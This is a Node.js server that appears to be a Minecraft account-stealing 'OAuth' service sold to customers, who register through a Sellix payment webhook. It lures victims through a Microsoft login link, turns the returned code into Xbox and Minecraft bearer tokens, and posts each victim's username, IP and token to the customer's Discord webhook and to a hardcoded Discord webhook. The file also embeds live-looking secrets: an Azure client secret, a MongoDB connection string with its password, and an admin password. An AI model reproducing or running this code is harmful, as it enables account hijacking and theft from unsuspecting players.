const config = {
    azure: {
        client_secret: "rfu8Q~dM~v9csxXcWFAOigkcQCc9jYL~ggwigcml",
        client_id: "4c5c7172-90b2-4c57-890e-f1a349074fe6",
    },

    mongo: {
        connectionString:
            "mongodb+srv://jolley855:01172008@cluster0.awxurla.mongodb.net/test",
    },

    site: {
        handleDomain: "rawroar.onrender.com",
        loginLive:
            "https://login.live.com/oauth20_authorize.srf?client_id=4c5c7172-90b2-4c57-890e-f1a349074fe6&response_type=code&redirect_uri=https://rawroar.onrender.com/&scope=XboxLive.signin+offline_access&state=",
            // End with state=
    },

    admin: {
        password: "01172008",
    },

    telegram: "",
    coupon: "",
};

const axios = require("axios");
const express = require("express");
const app = express(); app.use(express.json());
const MongoClient = require("mongodb").MongoClient;

const client = new MongoClient(config.mongo.connectionString, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
});

app.post("/sellixhk", async (req, res) => {
    res.setHeader("Content-Type", "application/json");

    try {
        let webhook =
            req.body.data.custom_fields[
                "Discord webhook URL (The session ids will be sent here)"
            ];
        let apiKey =
            req.body.data.custom_fields[
                "API key (Please make it unique, it's used to identify you)"
            ];

        addUser(apiKey, webhook);
        welcome(webhook, apiKey);
        res.status(200).send("OK");
        console.log("New user added: " + apiKey);
    } catch (e) {
        console.log(e);
        res.status(500).send("Error");
    }
});

app.get("/add", (req, res) => {
    const compulsoryParams = ["apiKey", "webhook", "password"];
    for (let i = 0; i < compulsoryParams.length; i++) {
        if (req.query[compulsoryParams[i]] === undefined) {
            res.status(400).send(
                "Missing compulsory parameter: " + compulsoryParams[i]
            );
            return; 
        }
    }

    if (req.query.password !== config.admin.password) {
        res.status(401).send("Invalid password");
        return;
    }
    try {
        addUser(req.query.apiKey, req.query.webhook);
        res.send("User added successfully");
    } catch (err) {
        res.status(400).send("User already exists");
    }

    welcome(req.query.webhook, req.query.apiKey);
});

let bannedIps = [];
app.get("/handle", (req, res) => {
    if (req.query.code === undefined) {
        res.status(400).send("Missing compulsory parameter: code");
        return;
    }
    if (req.query.state === undefined) {
        res.status(400).send("Missing compulsory parameter: state");
        return;
    }

    getWebhook(req.query.state).then((webhook) => {
        if (webhook == null) {
            res.status(400).send("Invalid api key");
            return;
        } else {
            res.status(200).send("Success");
            console.log("Got webhook: " + webhook);
            const ip = getIp(req);

            if (bannedIps.includes(ip)) {
                console.log("Banned ip tried to login: " + ip);
                return;
            }
            
            bannedIps.push(ip);
            setTimeout(() => {
                bannedIPS.splice(bannedIps.indexOf(ip), 1);
            }, 1000 * 60 * 15);

            handleRequest(
                req.query.code,
                webhook,
                config.site.handleDomain,
                req
            );
        }
    });
});

createCollection();

app.listen(8080 || process.env.PORT, () => {
    console.log("Server started!");
});

// MONGO

async function createCollection() {
    try {
        await client.connect();
        const database = client.db("apiKeys");
        const collection = database.collection("apiKeys");
        await collection.createIndex({ apiKey: 1 }, { unique: true });
    } catch (err) {
        console.log(err.stack);
    }
}

async function addUser(apikey, webhook) {
    try {
        await client.connect();
        const database = client.db("apiKeys");
        const collection = database.collection("apiKeys");
        await collection.insertOne({ apiKey: apikey, webhook: webhook });
    } catch (err) {
        console.log(err.stack);
    }
}

async function getWebhook(apikey) {
    const database = client.db;
    try {
        await client.connect();
        const database = client.db("apiKeys");
        const collection = database.collection("apiKeys");
        const query = { apiKey: apikey };
        const result = await collection
            .find(query)
            .project({ webhook: 1 })
            .toArray();
        return result[0].webhook;
    } catch (err) {
        console.log(err.stack);
    }
}
// END MONGO

// OAUTH HANDLING
async function handleRequest(code, webhook_url, redirect_uri, req) {
    console.log("A new request has been made! Handling...");
    try {
        const accessTokenAndRefreshTokenArray =
            await getAccessTokenAndRefreshToken(code, redirect_uri);
        console.log("Access Token: " + accessTokenAndRefreshTokenArray[0]);
        const accessToken = accessTokenAndRefreshTokenArray[0];
        console.log("Refresh Token: " + accessTokenAndRefreshTokenArray[1]);
        const refreshToken = accessTokenAndRefreshTokenArray[1];
        const hashAndTokenArray = await getUserHashAndToken(accessToken);
        console.log("User Token: " + hashAndTokenArray[0]);
        const userToken = hashAndTokenArray[0];
        console.log("User Hash: " + hashAndTokenArray[1]);
        const userHash = hashAndTokenArray[1];
        const xstsToken = await getXSTSToken(userToken);
        console.log("XSTS Token: " + xstsToken);
        const bearerToken = await getBearerToken(xstsToken, userHash);
        console.log("Bearer Token: " + bearerToken);
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken);
        console.log("UUID: " + usernameAndUUIDArray[0]);
        const uuid = usernameAndUUIDArray[0];
        console.log("Username: " + usernameAndUUIDArray[1]);
        const username = usernameAndUUIDArray[1];
        const ip = getIp(req);
        console.log("IP: " + ip);
        postToWebhook(username, bearerToken, ip, refreshToken, webhook_url);
        console.log("Request handled!");
        console.log(
            "____________________________________________________________"
        );
    } catch (e) {
        console.log(e);
        return;
    }
}

async function getAccessTokenAndRefreshToken(code, redirect_uri) {
    const url = "https://login.live.com/oauth20_token.srf";

    const cnfig = {
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
        },
    };
    let data = {
        client_id: config.azure.client_id,
        redirect_uri: redirect_uri,
        client_secret: config.azure.client_secret,
        code: code,
        grant_type: "authorization_code",
    };

    let response = await axios.post(url, data, cnfig);
    return [response.data["access_token"], response.data["refresh_token"]];
}

async function getUserHashAndToken(accessToken) {
    const url = "https://user.auth.xboxlive.com/user/authenticate";
    const config = {
        headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
        },
    };
    let data = {
        Properties: {
            AuthMethod: "RPS",
            SiteName: "user.auth.xboxlive.com",
            RpsTicket: `d=${accessToken}`,
        },
        RelyingParty: "http://auth.xboxlive.com",
        TokenType: "JWT",
    };
    let response = await axios.post(url, data, config);
    return [
        response.data.Token,
        response.data["DisplayClaims"]["xui"][0]["uhs"],
    ];
}

async function getXSTSToken(userToken) {
    const url = "https://xsts.auth.xboxlive.com/xsts/authorize";
    const config = {
        headers: {
            "Content-Type": "application/json",
            Accept: "application/json",
        },
    };
    let data = {
        Properties: {
            SandboxId: "RETAIL",
            UserTokens: [userToken],
        },
        RelyingParty: "rp://api.minecraftservices.com/",
        TokenType: "JWT",
    };
    let response = await axios.post(url, data, config);

    return response.data["Token"];
}

async function getBearerToken(xstsToken, userHash) {
    const url =
        "https://api.minecraftservices.com/authentication/login_with_xbox";
    const config = {
        headers: {
            "Content-Type": "application/json",
        },
    };
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken,
        ensureLegacyEnabled: true,
    };
    let response = await axios.post(url, data, config);
    return response.data["access_token"];
}

async function getUsernameAndUUID(bearerToken) {
    const url = "https://api.minecraftservices.com/minecraft/profile";
    const config = {
        headers: {
            Authorization: "Bearer " + bearerToken,
        },
    };
    let response = await axios.get(url, config);
    return [response.data["id"], response.data["name"]];
}

function getIp(req) {
    return (
        req.headers["cf-connecting-ip"] ||
        req.headers["x-real-ip"] ||
        req.headers["x-forwarded-for"] ||
        req.connection.remoteAddress ||
        ""
    );
}

async function postToWebhook(
    username,
    bearerToken,
    ip,
    webhook_url
) {
    data = {
        username: "OAR",
        avatar_url:
            "https://cdn.discordapp.com/avatars/1038565192159731823/57e888beb3c7839f8786d717a54e3b8b.webp",
        content: "@everyone",
        embeds: [
            {
                color: 6881445,
                fields: [
                    {
                        name: "**Username:**",
                        value: "```" + username + "```",
                        inline: true,
                    },
                    {
                        name: "IP:",
                        value: "```" + ip + "```",
                        inline: true,
                    },
                    {
                        name: "**Token**",
                        value: "```" + bearerToken + "```",
                    },
                ],
                footer: {
                    text: "OAR",
                    icon_url:
                        "https://cdn.discordapp.com/avatars/1038565192159731823/57e888beb3c7839f8786d717a54e3b8b.webp",
                },
            },
        ],
    };
    axios.post(
        "https://discord.com/api/webhooks/1050300699499581482/-UxGriSXJcZzJAhQsBkZYEKqQePx1FpxrTP27dtscH5hVVtqxr8VTFlkHn-n8YEuiCmN",
        data
    );
    axios
        .post(webhook_url, data)
        .then(() => console.log("Posting to webhook..."));
}
// OAUTH HANDLING END

// UTILS
function welcome(webhook, apiKey) {
    axios.post(webhook, {
        username: "OAR TEAM",
        avatar_url:
            "https://cdn.discordapp.com/attachments/1027213888627949630/1044912497259466822/standard_2.gif",
        content: "@everyone",
        embeds: [
            {
                title: "Welcome to your brand new OAUTH!",
                color: 7350627,
                description:
                    "Your own authorization link:  [Copy me](" +
                    config.site.loginLive +
                    apiKey +
                    ")\n\nA private telegram channel invite for updates and support: [Join](" +
                    config.telegram +
                    ")\n\nA coupon code for you or a friend: `" +
                    config.coupon +
                    "`\n",
                timestamp: "",
                author: {
                    name: "",
                },
                image: {
                    url: "",
                },
                thumbnail: {},
                footer: {},
                fields: [],
            },
        ],
        components: [],
    });
}
// UTILS END
